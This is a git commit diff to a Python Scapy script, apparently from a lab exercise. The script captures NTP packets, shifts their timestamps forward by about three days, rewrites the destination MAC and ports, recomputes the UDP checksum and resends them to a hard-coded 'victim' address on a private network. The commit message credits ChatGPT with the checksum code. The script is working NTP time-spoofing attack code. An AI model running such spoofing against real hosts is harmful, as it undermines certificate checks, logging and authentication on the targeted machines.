9ec43824dca9e3d099013d5073263ed4a4daf52a
mjkadzi <161668993+mjkadzi@users.noreply.github.com>
2024-04-28 16:20:01 -0500

    Update packet.py
    chatgpt did a bit of heavy lifting im not even gonna lie. that whole checksum bit looks disgusting but hey, it seems to make a new, valid checksum. off to test on the proxmox env

--- packet.py
+++ packet.py
@@ -1,39 +1,54 @@
-from scapy.all import IP, UDP, NTP, send, sniff, Ether
+from scapy.all import *
 from scapy.layers.ntp import NTP
-import time, datetime
-import os
+import time, datetime, socket, os, array
 
 
 server_ip = "10.10.10.12"
 victim_ip = "10.10.10.10"
 #all these values are hard coded for the sake of this exercise
 def send_ntp(server, packet):
-    print('here')
-    ntp_packet = packet
-    del ntp_packet[UDP].chksum
-    print("incoming packet")
-    #ntp_packet.show()
-    print()
+    try:
+        print('here')
+        ntp_packet = packet
+        ntp_packet[UDP].chksum = 0
+        print("incoming packet")
+        ntp_packet.show()
+        print()
 
-    ntp_packet[UDP].dport = 123
-    ntp_packet[UDP].sport = 123
-    #ntp_packet[NTP].ref = ntp_packet[NTP].ref + 259201
-    ntp_packet[NTP].orig = ntp_packet[NTP].ref + 259201
-    ntp_packet[NTP].recv = ntp_packet[NTP].ref + 259201
-    ntp_packet[NTP].sent = ntp_packet[NTP].ref + 259201
-    
-    ntp_packet[Ether].dst = "4e:c1:60:9c:84:bc"
+        ntp_packet[UDP].dport = 123
+        ntp_packet[UDP].sport = 123
 
-    #ip_packet = IP(src=server, dst=dest_ip)
-    #udp_packet = UDP(dport=123, sport=123)
-    print("Packet before sending")
-    ntp_packet.show()
-    #if ntp_packet.haslayer(UDP):
-    #    print("new checksum: " + str(ntp_packet[UDP].chksum))
-    #else:
-    #    print("Packet does not contain UDP layer")
-    send(ntp_packet, verbose=True)
+        #ntp_packet[NTP].ref = ntp_packet[NTP].ref + 259201
+        ntp_packet[NTP].orig = ntp_packet[NTP].ref + 259201
+        ntp_packet[NTP].recv = ntp_packet[NTP].ref + 259201
+        ntp_packet[NTP].sent = ntp_packet[NTP].ref + 259201
+        
+        ntp_packet[Ether].dst = "4e:c1:60:9c:84:bc"
 
+        #checksum bit
+        ntp_packet[UDP].chksum = checksum(ntp_packet)
+
+
+        #ip_packet = IP(src=server, dst=dest_ip)
+        #udp_packet = UDP(dport=123, sport=123)
+
+        print("Packet before sending")
+        ntp_packet.show()
+
+        send(ntp_packet, verbose=True)
+    except Exception as e:
+        print("An error occurred:", e)
+
+def checksum(packet):
+    udp_header = bytes(packet[UDP])
+    src_ip = socket.inet_aton(packet[IP].src)
+    dst_ip = socket.inet_aton(packet[IP].dst)
+    pseudo_header = struct.pack("!4s4sBBH", src_ip, dst_ip, 0, socket.IPPROTO_UDP, len(udp_header))
+    checksum = sum(array.array('H', pseudo_header)) + sum(array.array('H', udp_header))
+    checksum = (checksum >> 16) + (checksum & 0xFFFF)
+    checksum += checksum >> 16
+    checksum = ~checksum & 0xFFFF
+    return checksum
 
 def ntp_request(packet):
     print('here')
